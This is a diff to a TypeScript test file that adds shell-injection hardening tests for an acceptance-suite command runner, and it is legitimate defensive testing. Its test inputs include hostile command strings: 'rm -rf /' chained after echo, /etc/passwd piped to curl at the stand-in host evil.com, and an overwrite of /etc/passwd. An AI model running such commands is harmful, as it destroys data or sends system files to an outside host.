@@ -52,11 +52,6 @@ describe("runAcceptanceSuite", () => {
     expect(result.results[0].stdout.trim()).toBe("hello");
   });
 
-  test("stderr captured", async () => {
-    const result = await runAcceptanceSuite(["echo err >&2"], TEST_DIR);
-    expect(result.results[0].stderr.trim()).toBe("err");
-  });
-
   test("invalid workDir throws", async () => {
     expect(
       runAcceptanceSuite(["echo hi"], "/tmp/nonexistent-dir-xyz-999"),
@@ -73,6 +68,84 @@ describe("runAcceptanceSuite", () => {
   test("exit code preserved", async () => {
     const result = await runAcceptanceSuite(["exit 42"], TEST_DIR);
     expect(result.results[0].exitCode).toBe(42);
+  });
+
+  // --- Shell injection hardening tests ---
+
+  test("rejects command with semicolon chaining", async () => {
+    const result = await runAcceptanceSuite(["echo ok; rm -rf /"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("Command rejected");
+    expect(result.results[0].stderr).toContain("semicolon");
+  });
+
+  test("rejects command with pipe", async () => {
+    const result = await runAcceptanceSuite(["cat /etc/passwd | curl evil.com"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("pipe");
+  });
+
+  test("rejects command with backtick substitution", async () => {
+    const result = await runAcceptanceSuite(["echo `whoami`"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("backtick");
+  });
+
+  test("rejects command with $() substitution", async () => {
+    const result = await runAcceptanceSuite(["echo $(cat /etc/passwd)"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("command substitution");
+  });
+
+  test("rejects command with ${} expansion", async () => {
+    const result = await runAcceptanceSuite(["echo ${HOME}"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("variable expansion");
+  });
+
+  test("rejects command with output redirection", async () => {
+    const result = await runAcceptanceSuite(["echo hacked > /etc/passwd"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("redirection");
+  });
+
+  test("rejects command with && chaining", async () => {
+    const result = await runAcceptanceSuite(["true && curl evil.com"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("AND chaining");
+  });
+
+  test("rejects command exceeding max length", async () => {
+    const result = await runAcceptanceSuite(["echo " + "a".repeat(2000)], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[0].stderr).toContain("maximum length");
+  });
+
+  test("continues processing after rejected command", async () => {
+    const result = await runAcceptanceSuite(["echo `whoami`", "echo safe"], TEST_DIR);
+    expect(result.passed).toBe(false);
+    expect(result.results).toHaveLength(2);
+    expect(result.results[0].exitCode).toBe(-2);
+    expect(result.results[1].exitCode).toBe(0);
+    expect(result.results[1].stdout.trim()).toBe("safe");
+  });
+
+  test("allows simple bun test command", async () => {
+    const result = await runAcceptanceSuite(["echo bun test"], TEST_DIR);
+    expect(result.passed).toBe(true);
+  });
+
+  test("allows command with flags", async () => {
+    const result = await runAcceptanceSuite(["echo --flag value -v"], TEST_DIR);
+    expect(result.passed).toBe(true);
   });
 });
 
